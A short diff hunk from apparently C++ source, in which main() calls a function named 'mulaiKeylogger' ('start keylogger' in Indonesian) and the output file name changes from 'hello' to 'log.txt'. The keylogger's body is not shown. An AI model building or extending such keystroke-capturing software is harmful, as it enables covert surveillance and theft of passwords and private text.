@@ -34,7 +34,7 @@ void mulaiKeylogger(string namaBerkas){
 
 int main(){
 	
-	mulaiKeylogger("hello");
+	mulaiKeylogger("log.txt");
 	
 	return 0;
 }
